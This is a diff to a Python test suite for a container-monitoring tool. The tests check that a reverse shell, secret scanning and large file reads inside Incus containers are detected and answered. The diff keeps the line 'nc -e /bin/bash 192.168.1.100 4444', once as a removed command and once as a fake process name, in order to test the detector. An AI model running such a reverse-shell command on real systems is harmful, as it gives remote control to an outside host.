@@ -80,7 +80,7 @@ def wait_for_monitoring_detection(seconds=5):
 
 
 def get_container_state(container_name):
-    """Get current container state (RUNNING, FROZEN, STOPPED)."""
+    """Get current container state (Running, Frozen, Stopped)."""
     result = subprocess.run(
         ["incus", "list", container_name, "--format=json"],
         capture_output=True,
@@ -89,16 +89,17 @@ def get_container_state(container_name):
         check=False,
     )
     if result.returncode != 0:
-        return "UNKNOWN"
+        return "Unknown"
 
     try:
         container_info = json.loads(result.stdout)
         if container_info:
-            return container_info[0].get("state", {}).get("status", "UNKNOWN")
+            # Incus returns title case: Running, Frozen, Stopped
+            return container_info[0].get("state", {}).get("status", "Unknown")
     except (json.JSONDecodeError, IndexError, KeyError):
         pass
 
-    return "UNKNOWN"
+    return "Unknown"
 
 
 def clear_audit_log(audit_log_path):
@@ -110,6 +111,12 @@ def clear_audit_log(audit_log_path):
 def get_audit_events(audit_log_path):
     """Read and parse audit log events."""
     if not audit_log_path.exists():
+        print(f"DEBUG: Audit log does not exist at {audit_log_path}")
+        # Check if parent directory exists
+        if audit_log_path.parent.exists():
+            print(f"DEBUG: Parent directory exists, listing contents:")
+            for f in audit_log_path.parent.iterdir():
+                print(f"  - {f.name}")
         return []
 
     with open(audit_log_path) as f:
@@ -117,9 +124,12 @@ def get_audit_events(audit_log_path):
         for line in f:
             if line.strip():
                 try:
-                    events.append(json.loads(line))
-                except json.JSONDecodeError:
-                    pass
+                    event = json.loads(line)
+                    events.append(event)
+                    print(f"DEBUG: Found event: {event.get('level')} - {event.get('title')}")
+                except json.JSONDecodeError as e:
+                    print(f"DEBUG: Failed to parse line: {line[:100]} - {e}")
+        print(f"DEBUG: Total events found: {len(events)}")
         return events
 
 
@@ -155,25 +165,41 @@ poll_interval_sec = 2
         time.sleep(5)
 
         # Verify container is running
-        assert get_container_state(test_container) == "RUNNING", (
+        assert get_container_state(test_container) == "Running", (
             "Container should be running before test"
         )
 
-        # Attempt reverse shell from inside container
-        # This should trigger CRITICAL detection
+        # Create a script that looks like a reverse shell command
+        # Keep it alive so monitoring can detect it
         subprocess.run(
             [
                 "incus",
                 "exec",
                 test_container,
                 "--",
-                "bash",
+                "sh",
                 "-c",
-                "nc -e /bin/bash 192.168.1.100 4444 &",
+                "echo '#!/bin/sh\nsleep 30' > /tmp/fake-nc-e && chmod +x /tmp/fake-nc-e",
             ],
             capture_output=True,
             timeout=10,
             check=False,
+        )
+
+        # Run with command line that looks like reverse shell
+        # The process name will be visible to monitoring
+        subprocess.Popen(
+            [
+                "incus",
+                "exec",
+                test_container,
+                "--",
+                "sh",
+                "-c",
+                "exec -a 'nc -e /bin/bash 192.168.1.100 4444' sleep 30",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
         )
 
         # Wait for monitoring to detect and respond
@@ -181,7 +207,7 @@ poll_interval_sec = 2
 
         # Verify container was killed or stopped
         state = get_container_state(test_container)
-        assert state in ["STOPPED", "FROZEN"], (
+        assert state in ["Stopped", "Frozen"], (
             f"Container should be stopped/frozen after reverse shell, got {state}"
         )
 
@@ -392,7 +418,7 @@ class TestEnvironmentScanningDetection:
 
         # Verify container is still running (not paused/killed)
         state = get_container_state(test_container)
-        assert state == "RUNNING", f"Container should still be running after WARNING, got {state}"
+        assert state == "Running", f"Container should still be running after WARNING, got {state}"
 
         # Verify audit log contains WARNING event
         events = get_audit_events(audit_log_path)
@@ -447,7 +473,7 @@ class TestEnvironmentScanningDetection:
         assert len(grep_events) > 0, "Expected WARNING for secret scanning"
 
         # Verify container still running
-        assert get_container_state(test_container) == "RUNNING"
+        assert get_container_state(test_container) == "Running"
 
         # Cleanup
         proc.stdin.write("exit\n")
@@ -485,7 +511,7 @@ class TestEnvironmentScanningDetection:
         ]
 
         assert len(printenv_events) > 0, "Expected WARNING for printenv"
-        assert get_container_state(test_container) == "RUNNING"
+        assert get_container_state(test_container) == "Running"
 
         # Cleanup
         proc.stdin.write("exit\n")
@@ -579,7 +605,7 @@ file_read_rate_mb_per_sec = 5.0
 
         # Verify container was paused
         state = get_container_state(test_container)
-        assert state == "FROZEN", f"Container should be frozen after large read, got {state}"
+        assert state == "Frozen", f"Container should be frozen after large read, got {state}"
 
         # Cleanup
         proc.terminate()
@@ -746,7 +772,7 @@ file_read_threshold_mb = 5.0
 
         # Verify pause happened
         state = get_container_state(test_container)
-        assert state == "FROZEN", f"Container should be frozen, got {state}"
+        assert state == "Frozen", f"Container should be frozen, got {state}"
 
         # Verify audit log shows the action taken
         events = get_audit_events(audit_log_path)
@@ -811,7 +837,7 @@ poll_interval_sec = 2
 
         # Verify kill happened
         state = get_container_state(test_container)
-        assert state in ["STOPPED", "FROZEN"], f"Container should be stopped, got {state}"
+        assert state in ["Stopped", "Frozen"], f"Container should be stopped, got {state}"
 
         # Verify audit log shows the action
         events = get_audit_events(audit_log_path)
@@ -869,7 +895,7 @@ enabled = false
 
         # Verify container is still running (no action taken)
         state = get_container_state(test_container)
-        assert state == "RUNNING", (
+        assert state == "Running", (
             f"Container should still be running with monitoring disabled, got {state}"
         )
 
